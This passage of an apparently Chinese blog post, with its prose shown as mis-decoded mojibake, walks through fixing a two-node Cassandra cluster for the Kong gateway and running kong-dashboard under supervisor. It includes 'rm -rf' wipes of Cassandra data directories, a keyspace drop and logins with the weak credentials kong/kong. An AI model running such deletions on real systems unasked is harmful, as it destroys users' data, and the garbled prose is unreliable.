class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /data/cassandra/*</span><br></pre></td></tr></table></figure><h5 id="å¯åŠ¨node2ä¸Šçš„æ•°æ®åº“"><a href="#å¯åŠ¨node2ä¸Šçš„æ•°æ®åº“" class="headerlink" title="å¯åŠ¨node2ä¸Šçš„æ•°æ®åº“"></a>å¯åŠ¨node2ä¸Šçš„æ•°æ®åº“</h5><p>ç›´æ¥åœ¨å‘½ä»¤è¡Œæ‰§è¡Œ:cassandra</p><h5 id="æŸ¥çœ‹cassandraçš„å•å°æœåŠ¡å™¨çŠ¶æ€"><a href="#æŸ¥çœ‹cassandraçš„å•å°æœåŠ¡å™¨çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹cassandraçš„å•å°æœåŠ¡å™¨çŠ¶æ€"></a>æŸ¥çœ‹cassandraçš„å•å°æœåŠ¡å™¨çŠ¶æ€</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ nodetool info</span><br><span class="line">ID                     : 4fe1df37-e69e-4a25-acdc-4b2d73a92225</span><br><span class="line">Gossip active          : true</span><br><span class="line">Thrift active          : false</span><br><span class="line">Native Transport active: true</span><br><span class="line">Load                   : 522.87 KiB</span><br><span class="line">Generation No          : 1540372001</span><br><span class="line">Uptime (seconds)       : 63895</span><br><span class="line">Heap Memory (MB)       : 404.89 / 1004.00</span><br><span class="line">Off Heap Memory (MB)   : 0.00</span><br><span class="line">Data Center            : datacenter1</span><br><span class="line">Rack                   : rack1</span><br><span class="line">Exceptions             : 0</span><br><span class="line">Key Cache              : entries 59, size 5.03 KiB, capacity 50 MiB, 7540 hits, 7911 requests, 0.953 recent hit rate, 14400 save period in seconds</span><br><span class="line">Row Cache              : entries 0, size 0 bytes, capacity 0 bytes, 0 hits, 0 requests, NaN recent hit rate, 0 save period in seconds</span><br><span class="line">Counter Cache          : entries 0, size 0 bytes, capacity 25 MiB, 0 hits, 0 requests, NaN recent hit rate, 7200 save period in seconds</span><br><span class="line">Chunk Cache            : entries 28, size 1.75 MiB, capacity 219 MiB, 1237 misses, 26133 requests, 0.953 recent hit rate, NaN microseconds miss latency</span><br><span class="line">Percent Repaired       : 100.0%</span><br><span class="line">Token                  : (invoke with -T/--tokens to see all 256 tokens)</span><br></pre></td></tr></table></figure><h5 id="æŸ¥çœ‹cassandraé›†ç¾¤çŠ¶æ€-å¯ä»¥çœ‹åˆ°é›†ç¾¤ä¸­2å°æœåŠ¡å™¨"><a href="#æŸ¥çœ‹cassandraé›†ç¾¤çŠ¶æ€-å¯ä»¥çœ‹åˆ°é›†ç¾¤ä¸­2å°æœåŠ¡å™¨" class="headerlink" title="æŸ¥çœ‹cassandraé›†ç¾¤çŠ¶æ€.å¯ä»¥çœ‹åˆ°é›†ç¾¤ä¸­2å°æœåŠ¡å™¨"></a>æŸ¥çœ‹cassandraé›†ç¾¤çŠ¶æ€.å¯ä»¥çœ‹åˆ°é›†ç¾¤ä¸­2å°æœåŠ¡å™¨</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ nodetool status</span><br><span class="line">Datacenter: datacenter1</span><br><span class="line">=======================</span><br><span class="line">Status=Up/Down</span><br><span class="line">|/ State=Normal/Leaving/Joining/Moving</span><br><span class="line">--  Address        Load       Tokens       Owns (effective)  Host ID                               Rack</span><br><span class="line">UN  10.80.229.244  339.93 KiB  256          51.3%             04a75f63-be99-4f3e-93ff-937bbe9656d8  rack1</span><br><span class="line">UN  10.25.87.159   522.87 KiB  256          48.7%             4fe1df37-e69e-4a25-acdc-4b2d73a92225  rack1</span><br></pre></td></tr></table></figure><hr><h4 id="ä»¥ä¸‹æ˜¯æˆ‘è¸©è¿‡çš„å‘-åœ¨æ²¡æœ‰åˆ é™¤node2ä¸Šçš„æ•°æ®åº“æ–‡ä»¶æƒ…å†µä¸‹-ç›´æ¥å¯åŠ¨cassnadra"><a href="#ä»¥ä¸‹æ˜¯æˆ‘è¸©è¿‡çš„å‘-åœ¨æ²¡æœ‰åˆ é™¤node2ä¸Šçš„æ•°æ®åº“æ–‡ä»¶æƒ…å†µä¸‹-ç›´æ¥å¯åŠ¨cassnadra" class="headerlink" title="ä»¥ä¸‹æ˜¯æˆ‘è¸©è¿‡çš„å‘.åœ¨æ²¡æœ‰åˆ é™¤node2ä¸Šçš„æ•°æ®åº“æ–‡ä»¶æƒ…å†µä¸‹,ç›´æ¥å¯åŠ¨cassnadra."></a>ä»¥ä¸‹æ˜¯æˆ‘è¸©è¿‡çš„å‘.åœ¨æ²¡æœ‰åˆ é™¤node2ä¸Šçš„æ•°æ®åº“æ–‡ä»¶æƒ…å†µä¸‹,ç›´æ¥å¯åŠ¨cassnadra.</h4><p>å¯åŠ¨node2çš„cassandraå.å‘ç°é›†ç¾¤æ— æ³•æ­£å¸¸å¯åŠ¨.ä½¿ç”¨cassandraè‡ªå¸¦çš„nodetoolå·¥å…·å¯ä»¥æŸ¥çœ‹é›†ç¾¤çŠ¶æ€.è¿™é‡Œåªæœ‰è‡ªå·±ä¸€å°æœåŠ¡å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node2 ~]$ nodetool status</span><br><span class="line">Datacenter: datacenter1</span><br><span class="line">=======================</span><br><span class="line">Status=Up/Down</span><br><span class="line">|/ State=Normal/Leaving/Joining/Moving</span><br><span class="line">--  Address        Load       Tokens       Owns (effective)  Host ID                               Rack</span><br><span class="line">UN  10.80.229.244  600.05 KiB  256          100.0%            4fe1df37-e69e-4a25-acdc-4b2d73a92225  rack1</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹cassandraå¯åŠ¨æ—¥å¿—,å‘ç°æ—¥å¿—æç¤ºå’Œnode1æœ‰ä¸€æ ·çš„token:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">less /usr/local/cassandra/logs/system.log</span><br><span class="line"></span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -9066137612411979055.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -912539082610246005.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -9125687604150710607.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -9186325188411815558.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -934168442605847346.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -937629522304513228.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,874 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token -983284835358960159.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1111859401021864246.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1185525604491731552.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1209704333924286496.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1243859262038298713.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1284321765579584761.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1472069791929520463.  Ignoring /10.25.87.159</span><br><span class="line">INFO  [GossipStage:1] 2018-10-24 17:07:26,875 StorageService.java:2386 - Nodes /10.25.87.159 and /10.80.229.244 have the same token 1479257042759500258.  Ignoring /10.25.87.159</span><br></pre></td></tr></table></figure><p>ä¸ä»…å¦‚æ­¤,åœ¨node1ä¸Šå¯åŠ¨kong,æç¤ºcassandraæ•°æ®åº“éªŒè¯å¤±è´¥.ä»¥åŠæç¤ºkongéœ€è¦migrations up(åªéœ€è¦åœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨kongæ—¶æ‰éœ€è¦migratios up):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ kong restart -c /etc/kong/kong.conf</span><br><span class="line">Error: /usr/local/share/lua/5.1/kong/cmd/start.lua:37: [cassandra error] the current database schema does not match this version of Kong. Please run `kong migrations up` to update/initialize the database schema. Be aware that Kong migrations should only run from a single node, and that nodes running migrations concurrently will conflict with each other and might corrupt your database schema!</span><br></pre></td></tr></table></figure><p>kong migrationså¤±è´¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> work@kong-node1 bin]$ kong migrations up -c /etc/kong/kong.conf</span><br><span class="line">migrating core for keyspace kong</span><br><span class="line">core migrated up to: 2015-01-12-175310_skeleton</span><br><span class="line">Error: [cassandra error] Error during migration 2015-01-12-175310_init_schema: [Invalid] Undefined column name request_host</span><br></pre></td></tr></table></figure><h5 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h5><p>å¯åŠ¨node1å’Œnode2çš„cassandra</p><p>1.åœ¨node1å’Œnode2ä¸Šdrop kongçš„é”®ç©ºé—´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ cqlsh 10.25.87.159 -ukong -pkong</span><br><span class="line">Connected to dwd_cassandra at 10.25.87.159:9042.</span><br><span class="line">[cqlsh 5.0.1 | Cassandra 3.11.3 | CQL spec 3.4.4 | Native protocol v4]</span><br><span class="line">Use HELP for help.</span><br><span class="line">kong@cqlsh&gt; drop keyspace kong;</span><br><span class="line">kong@cqlsh&gt; exit</span><br><span class="line"></span><br><span class="line">[work@kong-node2 ~]$ cqlsh 10.80.229.244 -ukong -pkong</span><br><span class="line">Connected to dwd_cassandra at 10.80.229.244:9042.</span><br><span class="line">[cqlsh 5.0.1 | Cassandra 3.11.3 | CQL spec 3.4.4 | Native protocol v4]</span><br><span class="line">Use HELP for help.</span><br><span class="line">kong@cqlsh&gt; drop KEYSPACE kong;</span><br><span class="line">ConfigurationException: Cannot drop non existing keyspace &apos;kong&apos;.</span><br><span class="line">kong@cqlsh&gt; exit</span><br></pre></td></tr></table></figure><p>2.åˆ é™¤kongçš„é”®ç©ºé—´ç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[work@kong-node1 bin]$ rm -rf  /data/cassandra/kong/</span><br><span class="line">[work@kong-node1 bin]$ ll /data/cassandra/kong/</span><br><span class="line">ls: cannot access /data/cassandra/kong/: No such file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[work@kong-node2 ~]$ rm -rf /data/cassandra/kong/</span><br><span class="line">[work@kong-node2 ~]$ ll /data/cassandra/kong/</span><br><span class="line">ls: cannot access /data/cassandra/kong/: No such file or directory</span><br></pre></td></tr></table></figure><p>3.åœ¨node1ä¸Šåˆ›å»ºkongé”®ç©ºé—´.åˆ›å»ºå®Œæ¯•å,åº”è¯¥ä¼šåŒæ­¥åˆ°node2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ cqlsh 10.25.87.159 -ukong -pkong</span><br><span class="line">Connected to dwd_cassandra at 10.25.87.159:9042.</span><br><span class="line">[cqlsh 5.0.1 | Cassandra 3.11.3 | CQL spec 3.4.4 | Native protocol v4]</span><br><span class="line">Use HELP for help.</span><br><span class="line">kong@cqlsh&gt; CREATE KEYSPACE kong WITH REPLICATION = &#123; &apos;class&apos; : &apos;SimpleStrategy&apos;, &apos;replication_factor&apos; : 1&#125;;</span><br><span class="line">kong@cqlsh&gt; exit</span><br></pre></td></tr></table></figure><p>4.åœ¨node1ä¸Šæ‰§è¡Œ kong migrations up ,æ‰§è¡Œå®ŒååŒæ ·ä¼šåŒæ­¥åˆ°node2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">work@kong-node1 bin]$ kong migrations up -c /etc/kong/kong.conf</span><br><span class="line">migrating core for keyspace kong</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">66 migrations ran</span><br><span class="line">waiting for Cassandra schema consensus (10000ms timeout)...</span><br><span class="line">Cassandra schema consensus: reached</span><br></pre></td></tr></table></figure><p>5.åœ¨node1å’Œnode2ä¸Šå¯åŠ¨kong</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 bin]$ kong restart -c /etc/kong/kong.conf</span><br><span class="line"></span><br><span class="line">[work@kong-node2 ~]$ kong start -c /etc/kong/kong.conf</span><br><span class="line">Kong started</span><br></pre></td></tr></table></figure><hr><h3 id="æ­å»ºkong-dashboard"><a href="#æ­å»ºkong-dashboard" class="headerlink" title="æ­å»ºkong-dashboard"></a>æ­å»ºkong-dashboard</h3><p>kong-dashboardæ˜¯ç®¡ç†kongå„ä¸ªç»„ä»¶(serveice,route,plugin,upstream,consumer)çš„å¯è§†åŒ–UIç®¡ç†å·¥å…·.åœ¨å¢åˆ æ”¹æŸ¥å„ä¸ªç»„ä»¶çš„é…ç½®æ—¶éå¸¸æ–¹ä¾¿.</p><p>ç°åœ¨kong-dashboardä¹Ÿæ”¯æŒåˆ°äº†æœ€æ–°ç‰ˆçš„kongå’Œkongçš„æœ€æ–°ç»„ä»¶.</p><p>kong-dashboardçš„githubå‚è€ƒ:<a href="https://github.com/PGBI/kong-dashboard" target="_blank" rel="noopener">kong-dashboar</a></p><hr><p>1.ç¡®ä¿éœ€è¦æœ‰node.jsç¯å¢ƒ.å¦‚æœæ²¡æœ‰npmå·¥å…·,å¿…é¡»å…ˆå®‰è£…nodejs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ npm -v</span><br><span class="line">5.6.0</span><br><span class="line">[work@DWD-BETA kong]$ node -v</span><br><span class="line">v8.10.0</span><br></pre></td></tr></table></figure><p>2.rootç”¨æˆ·æ‰§è¡Œä¸‹åˆ—å®‰è£…å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# npm install -g kong-dashboard</span><br><span class="line">/usr/local/src/nodejs/bin/kong-dashboard -&gt; /usr/local/src/nodejs/lib/node_modules/kong-dashboard/bin/kong-dashboard.js</span><br><span class="line">+ kong-dashboard@3.5.0</span><br><span class="line">added 184 packages in 28.8s</span><br></pre></td></tr></table></figure><p>3.å¯åŠ¨kong-dashboard.å¯åŠ¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Start Kong Dashboard</span><br><span class="line">kong-dashboard start --kong-url http://kong:8001</span><br><span class="line"></span><br><span class="line"># Start Kong Dashboard on a custom port</span><br><span class="line">kong-dashboard start \</span><br><span class="line">  --kong-url http://kong:8001 \</span><br><span class="line">  --port [port]</span><br><span class="line"></span><br><span class="line"># Start Kong Dashboard with basic auth</span><br><span class="line">kong-dashboard start \</span><br><span class="line">  --kong-url http://kong:8001 \</span><br><span class="line">  --basic-auth user1=password1 user2=password2</span><br><span class="line"></span><br><span class="line"># See full list of start options</span><br><span class="line">kong-dashboard start --help</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯kong-dashboardæ˜¯å‰å°å¯åŠ¨,æ²¡æœ‰deamnizeæ¨¡å¼.æ‰€ä»¥å°†kong-dashboardåŠ å…¥åˆ°supervisorè¿›ç¨‹ç®¡ç†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# vim /etc/supervisor/conf.d/kong-dashboard.conf</span><br><span class="line"></span><br><span class="line">[program:kong-dashboard]</span><br><span class="line">command=/usr/local/src/nodejs/bin/kong-dashboard start --kong-url http://localhost:8001</span><br><span class="line">numprocs=1</span><br><span class="line">user=work</span><br><span class="line">stdout_logfile = /data/logs/kong/kong-dashboard.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æƒé™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# chown -R work.work /etc/supervisor/conf.d/</span><br></pre></td></tr></table></figure><p>æ›´æ–°supervisoré…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# supervisorctl update kong-dashboard</span><br><span class="line">kong-dashboard: added process group</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç”±äºæˆ‘è¿™å°æœåŠ¡å™¨ä¸Š8080ç«¯å£å·²ç»è¢«ä½¿ç”¨,æ‰€ä»¥å¯åŠ¨kong-dashboardæŠ¥é”™:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">work@DWD-BETA kong]$ /usr/local/src/nodejs/bin/kong-dashboard start --kong-url http://localhost:8001</span><br><span class="line">Connecting to Kong on http://localhost:8001 ...</span><br><span class="line">Connected to Kong on http://localhost:8001.</span><br><span class="line">Kong version is 0.14.1</span><br><span class="line">Starting Kong Dashboard on port 8080</span><br><span class="line">events.js:183</span><br><span class="line">      throw er; // Unhandled &apos;error&apos; event</span><br><span class="line">      ^</span><br><span class="line"></span><br><span class="line">Error: listen EADDRINUSE :::8080</span><br><span class="line">    at Object._errnoException (util.js:1022:11)</span><br><span class="line">    at _exceptionWithHostPort (util.js:1044:20)</span><br><span class="line">    at Server.setupListenHandle [as _listen2] (net.js:1367:14)</span><br><span class="line">    at listenInCluster (net.js:1408:12)</span><br><span class="line">    at Server.listen (net.js:1492:7)</span><br><span class="line">    at Application.listen (/usr/local/src/nodejs/lib/node_modules/kong-dashboard/node_modules/koa/lib/application.js:65:19)</span><br><span class="line">    at Server.start (/usr/local/src/nodejs/lib/node_modules/kong-dashboard/lib/server.js:32:9)</span><br><span class="line">    at startKongDashboard (/usr/local/src/nodejs/lib/node_modules/kong-dashboard/bin/kong-dashboard.js:189:10)</span><br><span class="line">    at request.get.then.then (/usr/local/src/nodejs/lib/node_modules/kong-dashboard/bin/kong-dashboard.js:178:5)</span><br><span class="line">    at &lt;anonymous&gt;</span><br></pre></td></tr></table></figure><p>8080ç«¯å£è¢«jenkinså ç”¨äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ netstat -tulnp | grep 8080</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      17955/java</span><br></pre></td></tr></table></figure><p>æ›´æ¢kong-dashboardç«¯å£ä¸º8081</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[program:kong-dashboard]</span><br><span class="line">command=/usr/local/src/nodejs/bin/kong-dashboard  start --kong-url http://localhost:8001 --port 8081</span><br><span class="line">numprocs=1</span><br><span class="line">user=work</span><br><span class="line">stdout_logfile = /data/logs/kong/kong-dashboard.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><p>æ›´æ–°supervisorå,ä»ç„¶æ— æ³•å¯åŠ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ supervisorctl update kong-dashboard</span><br><span class="line">kong-dashboard: stopped</span><br><span class="line">kong-dashboard: updated process group</span><br><span class="line">[work@DWD-BETA kong]$ supervisorctl status kong-dashboard</span><br><span class="line">kong-dashboard                   BACKOFF   Exited too quickly (process log may have details)</span><br></pre></td></tr></table></figure><p>æ‰‹åŠ¨å¯åŠ¨æ­£å¸¸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ /usr/local/src/nodejs/bin/kong-dashboard  start --kong-url http://localhost:8001 --port 8081</span><br><span class="line">Connecting to Kong on http://localhost:8001 ...</span><br><span class="line">Connected to Kong on http://localhost:8001.</span><br><span class="line">Kong version is 0.14.1</span><br><span class="line">Starting Kong Dashboard on port 8081</span><br><span class="line">Kong Dashboard has started on port 8081</span><br><span class="line">^C</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹supervisorå¯åŠ¨æ—¥å¿—æ–‡ä»¶:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ less /data/logs/kong/kong-dashboard.log</span><br><span class="line">/usr/bin/env: node: No such file or directory</span><br><span class="line">/usr/bin/env: node: No such file or directory</span><br><span class="line">/usr/bin/env: node: No such file or directory</span><br><span class="line">/usr/bin/env: node: No such file or directory</span><br></pre></td></tr></table></figure><p>ç½‘ä¸ŠæŸ¥æ‰¾è§£å†³æ–¹æ¡ˆ.è¯´æ˜¯è¦é“¾æ¥ä»¥ä¸‹æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/bin/nodejs /usr/bin/node</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™å°æœåŠ¡å™¨ä¸Šnodejsè·¯å¾„ä¸åŒ,æ‰€ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA kong]$ sudo ln -s /usr/local/src/nodejs /usr/bin/node</span><br></pre></td></tr></table></figure><p>ä»ç„¶æ— æ³•å¯åŠ¨,æç¤º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/env: node: Permission denied</span><br><span class="line">/usr/bin/env: node: Permission denied</span><br><span class="line">/usr/bin/env: node: Permission denied</span><br><span class="line">/usr/bin/env: node: Permission denied</span><br><span class="line">/usr/bin/env: node: Permission denied</span><br><span class="line">/usr/bin/env: node: Permission denied</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹kong-dashboardå¯åŠ¨ç”¨æˆ·ä¸ºroot.ä»ç„¶æ— æ³•å¯åŠ¨.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[program:kong-dashboard]</span><br><span class="line">command=/usr/local/src/nodejs/bin/kong-dashboard  start --kong-url http://127.0.0.1:8001 --port 8081</span><br><span class="line">numprocs=1</span><br><span class="line">user=root</span><br><span class="line">stdout_logfile = /data/logs/kong/kong-dashboard.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><hr><p>æ“ä½œå¤±è¯¯åœ¨åˆ›å»ºè½¯ä»¶çš„æ—¶å€™,åˆ é™¤äº†nodejsæºç›®å½•.é‡æ–°å®‰è£…äº†npmå’Œkong-dashboard</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">è§£å‹nodejsåŒ…åˆ°:/usr/local/node/</span><br><span class="line"></span><br><span class="line">#è®¾ç½®ç¯å¢ƒå˜é‡: </span><br><span class="line">[root@DWD-BETA ~]# cat /etc/profile | tail -2</span><br><span class="line">export NODEJS_HOME=/usr/local/node/</span><br><span class="line">export PATH=$PATH:$NODEJS_HOME/bin</span><br><span class="line"></span><br><span class="line">[root@DWD-BETA ~]# node -v</span><br><span class="line">v8.10.0</span><br><span class="line">[root@DWD-BETA ~]# npm -v</span><br><span 